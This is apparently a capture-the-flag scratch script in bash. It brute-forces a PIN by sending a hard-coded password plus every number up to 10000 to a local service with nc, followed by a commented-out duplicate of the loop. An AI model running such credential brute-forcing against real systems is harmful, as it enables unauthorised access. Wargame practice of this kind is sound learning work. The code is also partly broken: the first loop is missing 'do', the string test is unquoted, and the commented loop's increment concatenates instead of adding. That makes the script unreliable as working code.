#!/bin/bash
pass=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
for i in {0..12}
	echo "$pass $i" >> passes
done
cat passes | nc localhost 30002



pin=0
pass=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
while [ $pin -le 10000 ]
do
	res="$(echo $pass $pin | nc localhost 30002)"
	if [ $res != "Wrong! Please enter the correct pincode. Try again." ]; then
		echo Correct pin: $pin
		break
	fi
	((pin++))
done








#!/bin/bash
# pin=0
# pass=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
# while [ $pin -le 10000 ]
# do
# 	# echo $pass $pin
# 	res="$(echo $pass $pin | nc localhost 30002)"
# 	if [ $res != "Wrong! Please enter the correct pincode. Try again." ]; then
# 		echo Correct pin: $pin
# 		break
# 	fi
# 	pin=$pin+1
# done
